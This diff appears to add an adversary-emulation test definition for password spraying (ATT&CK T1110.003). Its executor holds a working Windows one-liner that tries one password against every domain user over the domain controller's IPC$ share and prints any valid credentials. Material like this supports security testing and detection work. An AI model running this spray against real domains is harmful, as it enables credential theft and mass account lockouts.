@@ -1,0 +1,32 @@
+attack_technique: T1110.003
+display_name: 'Brute Force: Password Spraying'
+atomic_tests:
+- name: Password Spray all Domain Users
+  description: 
+    CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
+
+    This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. 
+    Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period.
+    Use the input arguments to specify your own password to use for the password spray.
+
+    Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
+
+    See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
+  supported_platforms:
+  - windows
+  input_arguments:
+    password:
+      description: The password to try for each user in users.txt
+      type: string
+      default: Spring2020
+  dependencies:
+  - description: |
+      List of domain users to password spray must exits at %temp%\users.txt
+    prereq_command: |
+      if not exist %temp%\users.txt (exit /b 1)
+    get_prereq_command: |
+      PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+  executor:
+    command: |-
+      @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
+    name: command_prompt
